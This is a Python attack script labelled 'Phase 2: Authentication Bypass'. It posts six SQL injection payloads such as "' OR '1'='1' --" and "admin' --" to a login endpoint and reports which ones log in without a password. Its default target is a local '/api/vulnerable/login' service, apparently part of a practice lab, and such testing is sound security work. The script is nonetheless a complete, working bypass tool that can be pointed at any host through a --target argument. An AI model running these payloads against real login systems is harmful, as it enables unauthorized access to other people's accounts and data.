#!/usr/bin/env python3
"""Phase 2: Authentication Bypass - Login Without Password"""

import requests
import argparse


class Phase2AuthBypass:
    def __init__(self, target="http://localhost:5001"):
        self.target = target
        self.bypassed = []

    def test_bypass(self, name, payload, password="anything"):
        try:
            data = {"username": payload, "password": password}
            response = requests.post(
                f"{self.target}/api/vulnerable/login",
                json=data,
                timeout=5
            )

            if response.status_code == 200:
                try:
                    resp = response.json()
                    if resp.get("success"):
                        print(f"  ✅✅ {name} - BYPASS SUCCESSFUL!")
                        print(f"      Payload: {payload}")
                        if "user" in resp:
                            print(
                                f"      Logged in as: {resp['user'].get('username')}")
                        self.bypassed.append(name)
                        return True
                except:
                    pass

            print(f"  ❌ {name} - Failed")
            return False
        except Exception as e:
            print(f"  ❌ {name} - Error: {str(e)}")
            return False

    def run(self):
        print("\n" + "="*70)
        print("PHASE 2: AUTHENTICATION BYPASS")
        print("="*70)
        print(f"Target: {self.target}\n")

        tests = [
            ("Admin Comment Bypass", "admin' --"),
            ("Always True OR", "' OR '1'='1' --"),
            ("Admin OR True", "admin' OR '1'='1' --"),
            ("Numeric OR True", "' OR 1=1 --"),
            ("Hash Comment", "admin' #"),
            ("URL Encoded Bypass", "admin%27%20--"),
        ]

        for name, payload in tests:
            self.test_bypass(name, payload)
            print()

        print("="*70)
        print(f"✅ Phase 2 Complete: {len(self.bypassed)} bypasses found")
        print("="*70)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5001")
    args = parser.parse_args()
    phase = Phase2AuthBypass(target=args.target)
    phase.run()
